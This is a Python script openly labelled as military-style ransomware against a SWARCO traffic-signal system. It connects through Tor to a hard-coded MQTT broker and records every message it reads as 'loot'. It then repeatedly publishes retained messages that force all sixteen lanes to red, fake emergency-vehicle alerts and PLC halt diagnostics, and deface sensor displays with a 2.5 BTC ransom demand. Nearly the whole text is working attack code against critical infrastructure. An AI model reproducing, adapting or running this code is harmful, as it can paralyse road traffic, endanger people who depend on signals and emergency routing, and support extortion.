#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.3-AGGRESSIVE | TRUSTEDF57 | FASE1→IMMEDIATE LOCKDOWN

import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket
import socks
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class SWARCORansomware:
    def __init__(self):
        self.target_ip = "166.159.129.5"
        self.port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "fucknomoneySUCCHIALO"
        self.ransom = "2.5 BTC"
        
        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!'
        self.iv = b'SWARCO_SEMAFORI_16'
        
        # TOR SOCKS5
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        
        # FIX paho-mqtt 2.x
        self.mqtt_client = mqtt.Client(
            client_id="TRUSTEDF57_LOCKDOWN", 
            clean_session=False,
            callback_api_version=mqtt.CallbackAPIVersion.VERSION1
        )
        
        self.mqtt_client.on_connect = self.on_connect
        self.mqtt_client.on_message = self.on_message
        
        self.chaos_active = True
        self.aes_lockdown = False
        self.first_lockdown = False  # ← NUOVO: Lock immediato al primo overwrite
    
    def aes_encrypt_all(self, data):
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = data.encode() + b' ' * (16 - len(data.encode()) % 16)
        return base64.b64encode(encryptor.update(padded) + encryptor.finalize()).decode()
    
    def immediate_lockdown(self):
        """🔒 LOCKDOWN TOTALE IMMEDIATO - al primo overwrite"""
        if self.first_lockdown:
            return
            
        print("🚨 PRIMO OVERWRITE RILEVATO → AES TOTAL LOCKDOWN IMMEDIATO!")
        self.first_lockdown = True
        self.chaos_active = False
        self.aes_lockdown = True
        
        config_enc = self.aes_encrypt_all(json.dumps({
            "STATUS": "AES_LOCKDOWN_PERMANENT",
            "OP": self.op_name,
            "BTC": self.btc_addr,
            "KEY_HEX": self.aes_key.hex(),
            "DECRYPT_REQUIRED": True
        }))
        
        lockdown_payload = json.dumps({
            "LOCKDOWN": "PERMANENT",
            "AES_CONFIG": config_enc,
            "TRUSTEDF57": "TOTAL_CONTROL",
            "PLC_HALT": True,
            "ALL_TRAFFIC": "BLOCKED"
        })
        
        # 🔒 TUTTI I TOPIC CRITICI - RETAIN=TRUE
        critical_topics = [
            "traffic-triggers-output",
            "traffic-statistic-output/sensor1",
            "traffic-statistic-output/sensor2", 
            "traffic-statistic-output/sensor3",
            "plc-diagnostics",
            "comhub-diagnostics",
            "sdlc-diagnostics",
            "sensor-traffic-objects/#",
            "traffic-triggers-output",
            "#"  # Wildcard totale
        ]
        
        for topic in critical_topics:
            self.mqtt_client.publish(topic, lockdown_payload, qos=2, retain=True)
            print(f"🔒 PERMANENT_LOCK → {topic}")
    
    def fase1_chaos_aggressivo(self):
        """FASE1 AGGRESSIVA - semafori ROSSI + spam"""
        chaos_aggressivo = [
            # 🔥 SEMAFORI TUTTI ROSSI (lanes 1-16)
            {"topic": "traffic-triggers-output", "payload": json.dumps({
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
                "TRUSTEDF57": "FORCE_ALL_RED",
                "trigger_outputs": [{"traffic_triggers": [{"associated_lane": f"lane{i}", "FORCE_RED": True, "HALT": True, "TRUSTEDF57": True}], "trigger_output": 31+i} for i in range(1,17)]
            })},
            
            # 📱 DISPLAY SEMAFORI DEFACED
            {"topic": "traffic-statistic-output/sensor1", "payload": json.dumps({"🚨": "TRUSTEDF57_FULL_CONTROL", "BTC": self.btc_addr, "ALL_LANES": "RED_BLOCKED"})},
            {"topic": "traffic-statistic-output/sensor2", "payload": json.dumps({"🔒": "TOTAL_LOCKDOWN_ACTIVE", "PAGA": "2.5 BTC", "STATUS": "HALTED"})},
            {"topic": "traffic-statistic-output/sensor3", "payload": json.dumps({"❌": "SYSTEM_COMPROMISED", "OP": "TRUSTEDF57", "PLC": "DISABLED"})},
            
            # ⚙️ DIAGNOSTICHE BLOCCATE
            {"topic": "plc-diagnostics", "payload": json.dumps({"operation_mode": 0, "HALT": True, "CPU": 999, "TEMPERATURE": 999, "TRUSTEDF57": "LOCKED"})},
            {"topic": "comhub-diagnostics", "payload": json.dumps({"cpu_temperature": 9999, "memory_usage": 999, "STATUS": "CRITICAL_FAILURE", "OP": "TRUSTEDF57"})},
            
            # 🚨 EMERGENZE FAKE SU TUTTI SENSORI
            {"topic": "sensor-traffic-objects/sensor1", "payload": json.dumps({"EMERGENCY_VEHICLE": True, "speed": 999, "priority": 999, "TRUSTEDF57": True})},
            {"topic": "sensor-traffic-objects/sensor2", "payload": json.dumps({"EMERGENCY_VEHICLE": True, "speed": 999, "priority": 999, "TRUSTEDF57": True})},
            {"topic": "sensor-traffic-objects/sensor3", "payload": json.dumps({"EMERGENCY_VEHICLE": True, "speed": 999, "priority": 999, "TRUSTEDF57": True})}
        ]
        
        for p in chaos_aggressivo:
            self.mqtt_client.publish(p["topic"], p["payload"], qos=2, retain=True)
            print(f"💥 AGGRESSIVO → {p['topic'][:30]}...")
    
    def on_connect(self, client, userdata, flags, rc, properties=None):
        print(f"✅ CONNECTED rc={rc} | FASE1 AGGRESSIVA → LOCKDOWN IMMEDIATO su overwrite")
        client.subscribe("#", qos=2)
        
        threading.Thread(target=self.chaos_loop, daemon=True).start()
        threading.Thread(target=self.emergency_loop, daemon=True).start()
    
    def on_message(self, client, userdata, msg, properties=None):
        try:
            data = msg.payload.decode(errors='ignore')
            print(f"[LOOT] {msg.topic}: {data[:60]}...")
            
            # 🔐 NUOVO: Rileva overwrite → IMMEDIATE LOCKDOWN
            if "sensor" in msg.topic and ("TRUSTEDF57" not in data or len(data) < 100):
                print(f"🚨 OVERWRITE RILEVATO {msg.topic} → TRIGGER LOCKDOWN!")
                self.immediate_lockdown()
            
            enc_loot = self.aes_encrypt_all(f"{msg.topic}|{data}|{time.time()}")
            with open("swarco_total.aes", "ab") as f:
                f.write(f"{enc_loot}\n".encode())
        except:
            print(f"[BINARY] {msg.topic}: {len(msg.payload)}b")
    
    def chaos_loop(self):
        """Spam aggressivo ogni 0.3s"""
        while self.chaos_active:
            self.fase1_chaos_aggressivo()
            time.sleep(0.3)  # ← SUPER VELOCE
    
    def emergency_loop(self):
        """Emergenze continue"""
        while True:
            for sensor in ["sensor1","sensor2","sensor3"]:
                self.mqtt_client.publish(f"sensor-traffic-objects/{sensor}", 
                    json.dumps({"EMERGENCY": "TRUSTEDF57_CRITICAL", "speed": 9999}), qos=2)
            time.sleep(1)
    
    def run(self):
        while True:
            try:
                self.mqtt_client.connect(self.target_ip, self.port, 60)
                self.mqtt_client.loop_forever()
            except Exception as e:
                print(f"🔄 Reconnect: {e}")
                time.sleep(3)

if __name__ == "__main__":
    print("🚀 TRUSTEDF57 v2.3-AGGRESSIVE | FASE1→IMMEDIATE AES_LOCKDOWN")
    rw = SWARCORansomware()
    rw.run()
